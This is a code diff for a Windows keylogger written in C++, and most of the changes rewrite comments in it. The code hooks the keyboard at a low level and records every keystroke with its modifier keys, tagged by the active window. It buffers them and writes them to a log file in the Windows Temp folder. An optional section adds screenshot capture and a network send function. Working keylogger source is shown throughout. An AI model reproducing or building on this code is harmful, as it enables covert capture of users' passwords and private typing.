@@ -1,9 +1,9 @@
 #ifndef _WIN32_WINNT
-#define _WIN32_WINNT 0x0A00 // Windows 10 minimum
+#define _WIN32_WINNT 0x0A00
 #endif
 #define NTDDI_VERSION 0x0A000000
 
-#define WIN32_LEAN_AND_MEAN // reduce size of the windows headers
+#define WIN32_LEAN_AND_MEAN
 #define NOMINMAX
 #define _UNICODE
 #define UNICODE
@@ -22,15 +22,10 @@
 #include <sstream>
 #include <string>
 
-// ============================================================================
-// CONFIGURATION
-// ============================================================================
 constexpr size_t MAX_BUFFER_CHARS = 5000;
 constexpr UINT FLUSH_TIMER_ID = 1;
 constexpr UINT FLUSH_TIMER_INTERVAL_MS = 30000;
-// ============================================================================
-// GLOBAL STATE
-// ============================================================================
+
 struct KeyloggerState
 {
     std::wstring currentProcessName;
@@ -39,7 +34,8 @@ struct KeyloggerState
     size_t currentBufferSize = 0;
 
     // Modifiers state
-    // we have to follow modifiers states (only 4 modifiers exist)
+    // We have to follow modifiers states (only 4 modifiers exist)
+    // to write them instead of no printing as it normally does
     bool ctrlDown = false;
     bool altDown = false;
     bool shiftDown = false;
@@ -51,9 +47,7 @@ struct KeyloggerState
 static KeyloggerState g_state;
 static const std::wstring LOG_PATH = L"C:\\Windows\\Temp\\winkey.log";
 
-// ============================================================================
-// UTILITY FUNCTIONS
-// ============================================================================
+/**************************************************************************************************************/
 #ifdef BONUS
 void sendRequest(const std::wstring &message)
 {
@@ -126,7 +120,7 @@ bool doScreenshot(const std::wstring fileName)
     HBITMAP hBitmap = CreateCompatibleBitmap(hScreen, width, height);
     SelectObject(hMemDC, hBitmap);
 
-    // Copie écran → bitmap
+    // Screen copy as a bitmap
     BitBlt(hMemDC, 0, 0, width, height, hScreen, 0, 0, SRCCOPY);
 
     BITMAP bmp;
@@ -173,15 +167,15 @@ bool doScreenshot(const std::wstring fileName)
 }
 #endif
 
-// FLUSH BUFFER TO FILE
-// ============================================================================
+//
+// Purpose:
+//      Empties the buffer and writes its content for each process change
+//
 void FlushBuffer(void)
 {
-    // OutputDebugStringW(L">>> FlushBuffer() called");
-
-    if (g_state.keystrokeBuffer.empty()) // here empty only works if it is a vector
+    if (g_state.keystrokeBuffer.empty())
     {
-        OutputDebugStringW(L"    Buffer is empty, nothing to flush");
+        OutputDebugStringW(L"Buffer is empty, nothing to flush");
         return;
     }
 
@@ -250,9 +244,10 @@ std::wstring GetActiveProcessName()
     return (std::wstring(windowTitle));
 }
 
-// ============================================================================
-// PROCESS CHANGE DETECTION
-// ============================================================================
+//
+// Purpose:
+//      Detects process change to replace the page name
+//
 void HandleProcessChange(const std::wstring &newProcessName)
 {
     if (g_state.currentProcessName.empty())
@@ -270,9 +265,10 @@ void HandleProcessChange(const std::wstring &newProcessName)
     }
 }
 
-// ============================================================================
-// ADD KEYSTROKE TO BUFFER
-// ============================================================================
+//
+// Purpose:
+//      Adds each keystroke manually to our buffer, more reliable
+//
 void AddKeystrokeToBuffer(const std::wstring &key)
 {
     g_state.keystrokeBuffer.push_back(key);
@@ -280,9 +276,8 @@ void AddKeystrokeToBuffer(const std::wstring &key)
 
     if (g_state.currentBufferSize >= MAX_BUFFER_CHARS)
     {
-        FlushBuffer(); // new line
-        // Reinitialize timestamp
-        GetLocalTime(&g_state.bufferStartTime);
+        FlushBuffer();                          // New line
+        GetLocalTime(&g_state.bufferStartTime); // Reinitialize timestamp
     }
 }
 
@@ -306,26 +301,26 @@ std::wstring KeyToUnicode(const KBDLLHOOKSTRUCT *kbd)
     // & 0x8000 = pressed (physically pressed)
     if (g_state.capsLockOn)
     {
-        // we force the state in the table : 0x01 = bit low
+        // We force the state in the table : 0x01 = bit low
         keyboardState[VK_CAPITAL] = 0x01; // CapsLock is active
     }
 
     WCHAR buffer[5] = {0};
     HKL layout = GetKeyboardLayout(0);
 
-    // serves only for letters, digits, symbols
+    // Serves only for letters, digits, symbols
     int result = ToUnicodeEx(
-        kbd->vkCode,
-        kbd->scanCode,
-        keyboardState,
-        buffer,
-        4,
-        0x4, // flags, read only
-        layout);
+        kbd->vkCode,   // Logical key, not final character
+        kbd->scanCode, // Material scan of the key (ex : 2 diff from num2)
+        keyboardState, // 256 octets state table of every single key (down, up, toggle)
+        buffer,        // Output buffer
+        4,             // Input buffer
+        0x4,           // Flags, here read only
+        layout);       // Specifies keyboard layout (ex : qwerty)
 
     // Check if result is not a control character either (< 0x20)
     // because it would be un unprintable char otherwise (ex: 0x13 is Ctrl+S)
-    // Avec flag 0x4, les dead keys retournent leur caractère de base
+    // With flag 0x4, dead keys return their 'base' character
     if (result > 0 && buffer[0] != L'\0' && buffer[0] >= 0x20)
         return std::wstring(buffer);
 
@@ -351,9 +346,13 @@ std::wstring KeyToUnicode(const KBDLLHOOKSTRUCT *kbd)
     return L"";
 }
 
-// ============================================================================
-// CALLBACK FUNCTION
-// ============================================================================
+//
+// Purpose :
+//      Called automatically by Windows everytime a hook event happens.
+//      Runs BEFORE the hook event runs.
+//
+// Parameters:
+//      lParam : points to KBDLLHOOKSTRUCT that contains the key details
 LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
 {
 
@@ -373,6 +372,7 @@ LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
             return CallNextHookEx(NULL, nCode, wParam, lParam);
         }
 
+        // Precise the VirtualKey state manually to display it later (we wait for the 'real' effect)
         switch (kbdStruct->vkCode)
         {
         case VK_SHIFT:
@@ -400,7 +400,7 @@ LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
         if (!isKeyDown)
             return CallNextHookEx(NULL, nCode, wParam, lParam);
 
-        // what is the pressed key ?
+        // What is the pressed key name to display ?
         std::wstring key;
         switch (kbdStruct->vkCode)
         {
@@ -425,7 +425,7 @@ LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
         default:
             key = KeyToUnicode(kbdStruct);
 
-            // If empty keym returns the keystroke name
+            // If empty key returns the keystroke name, special treatment for dead keys
             if (key.empty())
             {
                 // Manual mapping for dead keys in AZERTY
@@ -447,7 +447,7 @@ LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
                     }
                 }
 
-                // if still empty, fallback on VK code
+                // If still empty, last resort is to fallback on VK code and not lose the key
                 if (key.empty())
                 {
                     // Convert VK code in key name
@@ -477,10 +477,10 @@ LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
 
         std::wstring prefix;
 
-        // Ne pas afficher Ctrl+Alt si les DEUX sont pressés (c'est AltGr)
+        // To not display Ctrl+Alt if BOTH are pressed (it's AltGr)
         bool isAltGr = (g_state.ctrlDown && g_state.altDown);
-        // Build modifier prefix (Ctrl / Alt / Shift / Win)
 
+        // Build modifier prefix (Ctrl / Alt / Shift / Win)
         if (g_state.ctrlDown && !isAltGr)
             prefix += L"[Ctrl]";
         if (g_state.altDown && !isAltGr)
@@ -494,7 +494,6 @@ LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
         std::wstring finalKey = prefix + key;
 
         AddKeystrokeToBuffer(finalKey);
-        // LogEvent(buf);
     }
     return CallNextHookEx(NULL, nCode, wParam, lParam);
 }
@@ -507,15 +506,13 @@ VOID CALLBACK TimerProc([[maybe_unused]] HWND hwnd,
     FlushBuffer();
 }
 
-// The agent (launched as Session 1 by the service in Session 0)
+// The agent (launched as Session 1 by the service in Session 0) to allow lowlevel hook
 int main()
 {
     // Initialize Capslock state
     // & 0x0001 = toggle state (on/off)
     g_state.capsLockOn = (GetKeyState(VK_CAPITAL) & 0x0001) != 0;
 
-    // Instant writing test
-    // Test d'écriture au démarrage (CRITIQUE pour détecter les problèmes)
     FILE *testFile = OpenLogFile();
     if (testFile)
     {
@@ -551,9 +548,14 @@ int main()
 
     // Loop for the hook to work
     MSG msg;
+    // GetMessage retrieves the next nessage from the thread queue
     while (GetMessage(&msg, NULL, 0, 0))
     {
-        // TranslateMessage(&msg); // caused character problems
+        // Converts low level keyboard information into characters
+        // TranslateMessage(&msg); // Caused character problems, we treat it manually
+
+        // Sends the message to the windows procedure, allows Windows components
+        // to run normally
         DispatchMessage(&msg);
     }
 
